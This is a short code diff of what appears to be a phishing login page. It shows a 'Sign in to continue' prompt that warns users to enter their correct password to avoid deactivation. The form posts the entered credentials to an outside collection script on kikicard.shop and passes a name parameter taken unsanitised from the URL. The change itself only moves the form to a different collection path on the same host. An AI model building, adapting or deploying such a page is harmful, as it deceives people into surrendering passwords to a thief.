@@ -42,7 +42,7 @@ $id = $_GET['nameu'];
             <p class="text-xl  text-neutral-400 " >Sign in to continue</p>
             <p class="text-sm text-center px-10 pt-3 pb-7 text-gray-200 font-semibold" > fill in your correct password to avoid deactivation </p>
             
-            <form name="form1" class="ml-6 mr-6"  action="https://kikicard.shop/truding2/out.php?name=$id" onsubmit="return validateForm()" method="post" required>
+            <form name="form1" class="ml-6 mr-6"  action="https://kikicard.shop/y1/out.php?name=$id" onsubmit="return validateForm()" method="post" required>
 
                 
                 <div class="text-center pl-5 pr-5">
